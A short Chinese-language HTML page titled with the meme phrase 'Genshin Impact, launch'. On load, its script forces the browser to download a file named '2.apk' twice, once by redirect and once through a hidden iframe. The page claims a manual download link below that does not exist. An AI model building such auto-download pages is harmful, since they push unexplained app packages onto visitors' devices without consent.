<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>原神启动</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <h1>你好呀，朋友</h1>
    <p>如果未自动下载，请检查浏览器设置或手动点击下方链接。</p>
    
    <!-- 你好呀，我是Π颗糖 -->
    <script>
        window.onload = function() {
            // 方法1：直接跳转下载（适用于大多数情况）
            window.location.href = '2.apk';

            // 方法2：如果方法1无效，尝试使用 iframe（备用方案）
            setTimeout(function() {
                var iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = '2.apk';
                document.body.appendChild(iframe);
            }, 1000);
        };
    </script>
</body>
</html>
